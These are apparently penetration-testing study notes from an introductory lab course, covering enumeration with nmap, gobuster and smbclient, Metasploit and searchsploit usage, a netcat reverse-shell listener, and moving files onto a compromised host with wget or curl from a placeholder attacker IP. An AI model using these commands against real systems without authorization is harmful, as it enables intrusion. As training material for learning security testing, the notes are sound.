# 🛠️ Tools and Cheatsheets

## Socat

A tool like netcat but with more functionality like port forwarding and connecting to serial devices.

---

## Common Ports

[PacketLife Common Ports (Archived PDF)](https://web.archive.org/web/20240315102711/https://packetlife.net/media/library/23/common-ports.pdf)

---

## Tmux Cheatsheet

[tmuxcheatsheet.com](https://tmuxcheatsheet.com/)

---

## Vim Basics

```text
i       → insert mode  
esc     → leave insert mode  
x       → cut character  
dw      → cut word  
dd      → cut full line  
yw      → copy word  
yy      → copy full line  
p       → paste

# Multiply commands:
4yw     → copy 4 words

# Command mode:
:1      → go to line 1  
:w      → save file  
:q      → quit  
:q!     → quit without saving  
:wq     → write and quit
```

---

# 🧪 Scanning and Enumeration

## Nmap

```text
PORT    STATE    SERVICE
21/tcp  open     ftp

# Notes:
- Scans the 1000 most common ports by default.
- Default scan performs a TCP handshake.
- "filtered" state means a firewall is blocking the port.
- "SERVICE" shows the typical service name.
- To see the actual process, specify additional flags.

# Parameters:
-sC     → default scripts for detailed info  
-sV     → service/version detection  
-p-     → scan all ports

# Banner Grabbing:
nmap -sV --script=banner <target>
```

## smbclient

```bash
# Enumerate SMB shares:
smbclient -N -L \\10.129.42.253

# Flags:
-L     → list available shares  
-N     → suppress password prompt
```

---

# 🌐 Web Enumeration

## Gobuster

```bash
# Directory enumeration:
gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt

# Response codes:
200 → successful  
403 → forbidden  
301 → redirection

# DNS subdomain enumeration:
gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt

# Prerequisites:
- Install SecLists  
- Set a DNS server like 1.1.1.1 in /etc/resolv.conf
```

## curl

```bash
# Banner grabbing:
curl -IL https://www.inlanefreight.com
```

## whatweb

Like curl but more powerful for web enumeration.

## Certificates

SSL/TLS certificates may leak useful metadata for phishing or enumeration.

## robots.txt

This file tells crawlers what to ignore. It can expose sensitive or hidden directories.

## Source Code

Always check the source code of web pages. Developers sometimes leave sensitive info in comments or JavaScript.

---

# 🔍 Public Exploits

## searchsploit

```bash
# Install:
sudo apt install exploitdb -y

# Usage:
searchsploit openssh 7.2
```

## Metasploit (msfconsole)

```bash
# Find an exploit:
search exploit

# Use one:
use <exploit_path>

# Configure it:
show options
set <option> <value>

# Run it:
check
run or exploit
```

---

# 🔌 Connections

## Netcat

```bash
# Listen for a reverse shell:
nc -lvnp 1234

# Flags:
-l  → listen mode  
-v  → verbose  
-n  → no DNS resolution  
-p  → specify port
```

---

# 📁 Transferring Files

After gaining remote access via reverse shell, you may want to transfer files.

## Hosting a File with Python

```bash
cd /tmp
python3 -m http.server 8000
```

## Downloading with wget or curl (on the remote host)

```bash
# Using wget:
wget http://<your_ip>:8000/<file>

# Or using curl:
curl -O http://<your_ip>:8000/<file>
```

## SCP

If we gained ssh user credentials on the host, we can:

```bash
Yagan@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```

## Base64

In some cases, the host might have a **firewall** which prevents us from downloading files. In this case we can use a simple trick:

*base64 encode the file into **base64** fromat*

Then paste the string on the remote server and decode it.

to check the type of file to be sure if it has been transferred correctly we can:

```bash
user@remotehost$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```
and to check if the file was not corrupted we can run a **md5sum** on both files from the remote and main machine:

```bash
Yagan@htb[/htb]$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

### THIS MARKS THE END OF THE INTRODUCTION
